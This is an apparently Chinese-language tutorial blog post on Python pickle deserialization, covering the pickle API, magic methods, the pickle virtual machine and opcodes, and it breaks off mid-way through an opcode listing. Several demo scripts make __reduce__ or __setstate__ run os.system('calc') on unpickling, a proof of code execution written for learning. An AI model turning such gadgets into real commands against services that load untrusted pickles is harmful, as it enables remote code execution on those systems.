<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Pickle反序列化 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Pickle反序列化</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-11-14T10:51:00.692Z" id="date"> 2023-11-14</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-12-22T13:13:28.371Z" id="updated"> 2023-12-22</time></div></span><br><span>文章总字数: <div class="control">17.8k</div></span><br><span>预计阅读时间: <div class="control">78 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>之前学的反序列化一直是围绕PHP的，近期刷题也遇到pickle反序列化，故此学习一番，唉，Python反序列化都难，更别说Java了┭┮﹏┭┮</p>
<h1>0x02 简介</h1>
<p><code>Python</code>的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转化回原始的对象的一个过程, 这个和其他语言的序列化与反序列化其实都差不多.</p>
<p><code>Python</code>中序列化一般有两种方式: <code>pickle</code>模块和<code>json</code>模块, 前者是<code>Python</code>特有的格式, 后者是<code>json</code>通用的格式.</p>
<p>相较于<code>PHP</code>反序列化灵活多样的利用方式, 例如<code>POP</code>链构造, <code>Phar</code>反序列化, 原生类反序列化以及字符逃逸等. <code>Python</code>相对而言没有<code>PHP</code>那么灵活, 关于反序列化漏洞主要涉及这么几个概念: <code>pickle</code>, <code>pvm</code>, <code>__reduce__</code>魔术方法。</p>
<h1>0x03 Pickle</h1>
<h2 id="3-1-基础知识"><a href="#3-1-基础知识" class="headerlink" title="3-1-基础知识"></a>3.1 基础知识</h2>
<p><code>Pickle</code>可以用于<code>Python</code>特有的类型和<code>Python</code>的数据类型间进行转换(所有<code>Python</code>数据类型).</p>
<p><code>Python</code>提供两个模块来实现序列化: <code>cPickle</code>和<code>pickle</code>. 这两个模块功能是一样的, 区别在于<code>cPickle</code>是<code>C</code>语言写的, 速度快; <code>pickle</code>是</p>
<p>纯<code>Python</code>写的, 速度慢. 在<code>Python3</code>中已经没有<code>cPickle</code>模块. <code>pickle</code>有如下四种操作方法:</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>dump</td>
<td>对象序列化到文件对象并存入文件</td>
</tr>
<tr>
<td>dumps</td>
<td>对象序列化为 bytes 对象（字符串格式的字节流）</td>
</tr>
<tr>
<td>load</td>
<td>对象反序列化并从文件中读取数据</td>
</tr>
<tr>
<td>loads</td>
<td>从 bytes 对象（字符串格式的字节流）反序列化</td>
</tr>
</tbody>
</table>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">pickle.dump(*obj*, *file*, *protocol=<span class="hljs-literal">None</span>*, ***, *fix_imports=<span class="hljs-literal">True</span>*)<br></code></pre></td></tr></table></figure>
<p>将打包好的对象 <em>obj</em> 写入文件中，其中protocol为pickling的协议版本（下同）。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">pickle.dumps(*obj*, *protocol=<span class="hljs-literal">None</span>*, ***, *fix_imports=<span class="hljs-literal">True</span>*)<br></code></pre></td></tr></table></figure>
<p>将 <em>obj</em> 打包以后的对象作为<code>bytes</code>类型直接返回。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">pickle.load(*file*, ***, *fix_imports=<span class="hljs-literal">True</span>*, *encoding=<span class="hljs-string">&quot;ASCII&quot;</span>*, *errors=<span class="hljs-string">&quot;strict&quot;</span>*)<br></code></pre></td></tr></table></figure>
<p>从文件中读取二进制字节流，将其反序列化为一个对象并返回。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">pickle.loads(*data*, ***, *fix_imports=<span class="hljs-literal">True</span>*, *encoding=<span class="hljs-string">&quot;ASCII&quot;</span>*, *errors=<span class="hljs-string">&quot;strict&quot;</span>*)<br></code></pre></td></tr></table></figure>
<p>从data中读取二进制字节流，将其反序列化为一个对象并返回。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">object</span>.__reduce__()<br></code></pre></td></tr></table></figure>
<p><code>__reduce__()</code>其实是object类中的一个魔术方法，我们可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。</p>
<p>Python要求该方法必须返回一个字符串或者元组。如果返回元组<code>(callable, ([para1,para2...])[,...])</code> ，那么每当该类的对象被反序列化时，该<code>callable</code>就会被调用，参数为<code>para1、para2...</code></p>
<p>这里在强调一下这个基础知识：</p>
<ul>
<li>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</li>
<li>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</li>
<li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</li>
<li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li>
</ul>
<h2 id="3-2-可序列化的对象"><a href="#3-2-可序列化的对象" class="headerlink" title="3-2-可序列化的对象"></a>3.2 可序列化的对象</h2>
<ul>
<li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
<li>整数、浮点数、复数</li>
<li>str、byte、bytearray</li>
<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>
<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>
<li>定义在模块最外层的内置函数</li>
<li>定义在模块最外层的类</li>
<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
</ul>
<h2 id="3-3-object-reduce-函数"><a href="#3-3-object-reduce-函数" class="headerlink" title="3-3-object-reduce-函数"></a>3.3 <code>object.__reduce__()</code> 函数</h2>
<ul>
<li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li>
<li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li>
</ul>
<h2 id="3-4-魔术方法"><a href="#3-4-魔术方法" class="headerlink" title="3-4-魔术方法"></a>3.4 魔术方法</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__reduce__() 反序列化时调用<br>__reduce_ex__() 反序列化时调用 //上面的升级版<br>__setstate__() 反序列化时调用<br>__getstate__() 序列化时调用<br></code></pre></td></tr></table></figure>
<p>这里用一个小迪的Demo来体会一下上述魔术方法的作用</p>
<h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a><code>__reduce__()</code></h3>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment">#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;反序列化调用&#x27;</span>)<br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;calc&#x27;</span>,))<br>a = A()<br>p_a = pickle.dumps(a)<br>pickle.loads(p_a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;==========&#x27;</span>)<br><span class="hljs-built_in">print</span>(p_a)<br></code></pre></td></tr></table></figure>
<p>上述先实例化一个a对象，接着对a对象进行dumps序列化，然后loads对a序列化后的字节流数据进行反序列化，最后打印出a序列化后的字节流数据。</p>
<p>注意这里的<code>__reduce__</code>魔术方法在反序列化时（也就是调用loads函数时）会被自动调用，随后打印一段字符，接着调用system执行calc命令，结果如下图。</p>
<p class='item-img' data-src='image-20231213184734661.png'><img src="image-20231213184734661.png" alt="image-20231213184734661"></p>
<p>我们将上述loads注释掉，会发现没有调用计算器，但却执行了reduce中的print函数，这里我就懵逼了，不是说只有loads反序列化时才会调用reduce方法吗。接着问了一下GPT发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在进行pickle.dumps时，会尝试调用reduce方法以获取序列化信息，因此会执行print函数。但在此阶段，其并不会执行返回的可调用对象和其他参数，只是单纯的获取这些信息用于后续的反序列化操作。<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231213184943131.png'><img src="image-20231213184943131.png" alt="image-20231213184943131"></p>
<p>这里有一个注意点，就是reduce的return部分，是必须要返回一个字符串或者是元组的，否则就会报错，如下图</p>
<p class='item-img' data-src='image-20231213191007068.png'><img src="image-20231213191007068.png" alt="image-20231213191007068"></p>
<p>不过一个懵逼的点是，我将上述os.system后面的逗号去掉之后，虽然报错，但依旧执行了calc命令。。。暂不清楚原因。</p>
<p class='item-img' data-src='image-20231213191208937.png'><img src="image-20231213191208937.png" alt="image-20231213191208937"></p>
<h3 id="setstate"><a href="#setstate" class="headerlink" title="setstate"></a><code>__setstate__()</code></h3>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span>():<br>    <span class="hljs-comment"># 构造函数的定义</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br>    <span class="hljs-comment"># 构造 __setstate__ 方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setstate__</span>(<span class="hljs-params">self, name</span>):<br>        os.system(<span class="hljs-string">&#x27;calc&#x27;</span>)  <span class="hljs-comment"># 恶意代码</span><br>tmp = pickle.dumps(SerializePerson(<span class="hljs-string">&#x27;tom&#x27;</span>))  <span class="hljs-comment">#序列化</span><br>pickle.loads(tmp)  <span class="hljs-comment"># 反序列化 此时会弹出计算器</span><br></code></pre></td></tr></table></figure>
<p>这里在反序列化时会自动调用<code>__setstate__</code>魔术方法，进而执行calc命令，如下图成功验证，但此函数的优先级低于reduce，且是静态方法。</p>
<p class='item-img' data-src='image-20231213190504610.png'><img src="image-20231213190504610.png" alt="image-20231213190504610"></p>
<h3 id="getstate"><a href="#getstate" class="headerlink" title="getstate"></a><code>__getstate__()</code></h3>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment">#序列化魔术方法调用-__getstate__</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getstate__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;序列化调用&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;calc&#x27;</span>)<br>a = A()<br>p_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;==========&#x27;</span>)<br><span class="hljs-built_in">print</span>(p_a)<br></code></pre></td></tr></table></figure>
<p>该函数会在序列化时自动调用，如下图成功验证</p>
<p class='item-img' data-src='image-20231213190847225.png'><img src="image-20231213190847225.png" alt="image-20231213190847225"></p>
<h2 id="3-5-简单使用"><a href="#3-5-简单使用" class="headerlink" title="3-5-简单使用"></a>3.5 简单使用</h2>
<h3 id="3-5-1-序列化操作"><a href="#3-5-1-序列化操作" class="headerlink" title="3-5-1-序列化操作"></a>3.5.1 序列化操作</h3>
<p>代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>():<br>	<span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">self, name=<span class="hljs-string">&#x27;h3rmesk1t&#x27;</span></span>):<br>		self.name = name<br><br><span class="hljs-built_in">print</span>(pickle.dumps(Demo()))<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231213184250405.png'><img src="image-20231213184250405.png" alt="image-20231213184250405"></p>
<p>在Python2与Python3下的运行结果如上图所示</p>
<p>输出的一大串字符实际上是一串<code>PVM</code>操作码，可以在<code>pickle.py</code>中看到关于这些操作码的详解.</p>
<p class='item-img' data-src='image-20231114192022665.png'><img src="image-20231114192022665.png" alt="image-20231114192022665"></p>
<h3 id="3-5-2-反序列化操作"><a href="#3-5-2-反序列化操作" class="headerlink" title="3-5-2-反序列化操作"></a>3.5.2 反序列化操作</h3>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name=<span class="hljs-string">&#x27;h3rmesk1t&#x27;</span></span>):<br>        self.name = name<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] 序列化&#x27;</span>)<br><span class="hljs-built_in">print</span>(pickle.dumps(Demo()))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] 反序列化&#x27;</span>)<br><span class="hljs-built_in">print</span>(pickle.loads(pickle.dumps(Demo())).name)<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231114192206885.png'><img src="image-20231114192206885.png" alt="image-20231114192206885"></p>
<h1>0x04 Pickle过程详细解读</h1>
<ul>
<li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li>
<li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li>
<li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
<li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
<li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li>
</ul>
<p>为了便于理解，hachp1师傅把BH讲稿中的相关部分制成了动图，PVM解析 <code>str</code> 的过程动图：</p>
<p class='item-img' data-src='20200320230631-6204866e-6abc-1-1699962626606-3.gif'><img src="20200320230631-6204866e-6abc-1-1699962626606-3.gif" alt="20200320230631-6204866e-6abc-1"></p>
<ul>
<li>PVM解析 <code>__reduce__()</code> 的过程动图：</li>
</ul>
<p class='item-img' data-src='20200320230711-7972c0ea-6abc-1.gif'><img src="20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p>
<h2 id="4-1-执行流程"><a href="#4-1-执行流程" class="headerlink" title="4-1-执行流程"></a>4.1 执行流程</h2>
<p>首先, <code>PVM</code>会把源代码编译成字节码, 字节码是<code>Python</code>语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果<code>Python</code>进程在主机上有写入权限, 那么它会把程序字节码保存为一个以<code>.pyc</code>为扩展名的文件. 如果没有写入权限, 则<code>Python</code>进程会在内存中生成字节码, 在程序执行结束后被自动丢弃.</p>
<p>一般来说, 在构建程序时最好给<code>Python</code>进程在主机上的写入权限, 这样只要源代码没有改变, 生成的<code>.pyc</code>文件就可以被重复利用, 提高执行效率, 同时隐藏源代码.</p>
<p>然后, <code>Python</code>进程会把编译好的字节码转发到<code>PVM</code>(<code>Python</code>虚拟机)中, <code>PVM</code>会循环迭代执行字节码指令, 直到所有操作被完成.</p>
<h2 id="4-2-opcode简介"><a href="#4-2-opcode简介" class="headerlink" title="4-2-opcode简介"></a>4.2 opcode简介</h2>
<ul>
<li>pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><br>a=&#123;<span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;2&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;# 原变量：<span class="hljs-subst">&#123;a!r&#125;</span>&#x27;</span>)<span class="hljs-comment"># 输出a的值</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;pickle版本<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))<br><br><span class="hljs-comment"># 输出：</span><br><span class="hljs-comment"># 原变量:&#123;&#x27;1&#x27;: 1, &#x27;2&#x27;: 2&#125;</span><br>Pcike版本<span class="hljs-number">0</span> <span class="hljs-string">b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span><br>Pcike版本<span class="hljs-number">1</span> <span class="hljs-string">b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br>Pcike版本<span class="hljs-number">2</span> <span class="hljs-string">b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br>Pcike版本<span class="hljs-number">3</span> <span class="hljs-string">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span><br></code></pre></td></tr></table></figure>
<ul>
<li>pickle3版本的opcode示例：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># &#x27;abcd&#x27;</span><br><span class="hljs-string">b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;</span><br><br><span class="hljs-comment"># \x80：协议头声明 </span><br><span class="hljs-comment"># \x03：协议版本</span><br><span class="hljs-comment"># \x04\x00\x00\x00：数据长度：4</span><br><span class="hljs-comment"># abcd：数据</span><br><span class="hljs-comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span><br><span class="hljs-comment"># \x00：栈顶位置</span><br><span class="hljs-comment"># .：数据截止</span><br></code></pre></td></tr></table></figure>
<ul>
<li>pickle0版本的部分opcode表格：</li>
</ul>
<table>
<thead>
<tr>
<th>Opcode</th>
<th>Mnemonic</th>
<th>Data type loaded onto the stack</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>S</td>
<td>STRING</td>
<td>String</td>
<td>S’foo’\n</td>
</tr>
<tr>
<td>V</td>
<td>UNICODE</td>
<td>Unicode</td>
<td>Vfo\u006f\n</td>
</tr>
<tr>
<td>I</td>
<td>INTEGER</td>
<td>Integer</td>
<td>I42\n</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
</tbody>
</table>
<ul>
<li>本表格截取了BH的pdf上的部分内容，完整表格可以直接在<a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">原pdf</a>中找到。</li>
</ul>
<h2 id="4-3-指令集"><a href="#4-3-指令集" class="headerlink" title="4-3-指令集"></a>4.3 指令集</h2>
<p>当前用于<code>pickling</code>的协议共有<code>6</code>种, 使用的协议版本越高, 读取生成的<code>pickle</code>所需的<code>Python</code>版本就要越新.</p>
<ul>
<li><code>v0</code>版协议是原始的&quot;人类可读&quot;协议, 并且向后兼容早期版本的<code>Python</code>.</li>
<li><code>v1</code>版协议是较早的二进制格式, 它也与早期版本的<code>Python</code>兼容.</li>
<li><code>v2</code>版协议是在<code>Python 2.3</code>中引入的, 它为存储<code>new-style class</code>提供了更高效的机制, 参阅<code>PEP 307</code>.</li>
<li><code>v3</code>版协议添加于<code>Python 3.0</code>, 它具有对<code>bytes</code>对象的显式支持, 且无法被<code>Python 2.x</code>打开, 这是目前默认使用的协议, 也是在要求与其他<code>Python 3</code>版本兼容时的推荐协议.</li>
<li><code>v4</code>版协议添加于<code>Python 3.4</code>, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅<code>PEP 3154</code>.</li>
<li><code>v5</code>版协议添加于<code>Python 3.8</code>, 它支持带外数据, 加速带内数据处理.</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span><br><span class="hljs-comment"># here is in kind-of alphabetical order of 1-character pickle code.</span><br><span class="hljs-comment"># pickletools groups them by purpose.</span><br><br>MARK           = <span class="hljs-string">b&#x27;(&#x27;</span>   <span class="hljs-comment"># push special markobject on stack</span><br>STOP           = <span class="hljs-string">b&#x27;.&#x27;</span>   <span class="hljs-comment"># every pickle ends with STOP</span><br>POP            = <span class="hljs-string">b&#x27;0&#x27;</span>   <span class="hljs-comment"># discard topmost stack item</span><br>POP_MARK       = <span class="hljs-string">b&#x27;1&#x27;</span>   <span class="hljs-comment"># discard stack top through topmost markobject</span><br>DUP            = <span class="hljs-string">b&#x27;2&#x27;</span>   <span class="hljs-comment"># duplicate top stack item</span><br>FLOAT          = <span class="hljs-string">b&#x27;F&#x27;</span>   <span class="hljs-comment"># push float object; decimal string argument</span><br>INT            = <span class="hljs-string">b&#x27;I&#x27;</span>   <span class="hljs-comment"># push integer or bool; decimal string argument</span><br>BININT         = <span class="hljs-string">b&#x27;J&#x27;</span>   <span class="hljs-comment"># push four-byte signed int</span><br>BININT1        = <span class="hljs-string">b&#x27;K&#x27;</span>   <span class="hljs-comment"># push 1-byte unsigned int</span><br>LONG           = <span class="hljs-string">b&#x27;L&#x27;</span>   <span class="hljs-comment"># push long; decimal string argument</span><br>BININT2        = <span class="hljs-string">b&#x27;M&#x27;</span>   <span class="hljs-comment"># push 2-byte unsigned int</span><br>NONE           = <span class="hljs-string">b&#x27;N&#x27;</span>   <span class="hljs-comment"># push None</span><br>PERSID         = <span class="hljs-string">b&#x27;P&#x27;</span>   <span class="hljs-comment"># push persistent object; id is taken from string arg</span><br>BINPERSID      = <span 